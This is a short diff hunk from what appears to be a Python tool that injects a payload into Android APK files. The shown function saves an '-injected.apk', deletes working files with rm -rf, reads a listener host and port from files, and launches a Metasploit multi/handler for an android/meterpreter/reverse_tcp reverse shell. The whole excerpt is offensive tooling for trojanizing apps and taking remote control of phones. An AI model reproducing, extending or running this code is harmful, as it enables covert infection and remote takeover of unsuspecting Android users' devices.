@@ -213,6 +213,13 @@ def embed():
             print(g+"[✓]"+w+" file saved as:- "+g+out+"/"+a3+"-injected.apk"+w)
             os.system("rm -rf '?' original.apk raw.apk "+a2+" "+a3)
             print("")
+            if os.path.isfile("host"):
+                if os.path.isfile("port"):
+                    host = open("host").readline().strip()
+                    port = open("port").readline().strip()
+                    pass
+                else:
+                    os.system("rm -rf payload payload.apk &> /dev//null")
             dog = str(input("do you want to start listener? (y/n) "))
             if dog == "y" or dog == "Y":
                 os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+host+';set lport '+port+';show options"')
